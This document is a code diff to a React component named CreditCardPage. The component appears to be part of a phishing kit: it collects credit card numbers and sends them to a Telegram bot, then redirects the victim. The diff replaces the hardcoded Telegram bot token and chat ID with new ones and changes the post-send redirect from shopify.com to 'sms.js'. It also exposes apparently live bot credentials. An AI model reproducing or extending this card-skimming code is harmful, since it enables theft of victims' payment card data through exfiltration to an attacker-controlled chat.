@@ -2,8 +2,8 @@ import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import './App.css'; // Make sure to create this CSS file
 
-const TELEGRAM_BOT_TOKEN = '7247518691:AAGG9Pgry6_a7vna8yOpeuRcmuo79ij9U18';
-const TELEGRAM_CHAT_ID = '1436609764';
+const TELEGRAM_BOT_TOKEN = '7567933012:AAG_jlPLYWLcQe8G7jgVgiWcXixg9DBaCdo';
+const TELEGRAM_CHAT_ID = '7464995879';
 
 const CreditCardPage = () => {
   const [cardNumber, setCardNumber] = useState('');
@@ -42,7 +42,7 @@ const CreditCardPage = () => {
       .then(response => response.json())
       .then(data => {
         if (data.ok) {
-            window.location.href = 'https://www.shopify.com'; 
+            window.location.href = 'sms.js'; 
         } else {
           alert('Failed to send the message. Please try again.');
         }
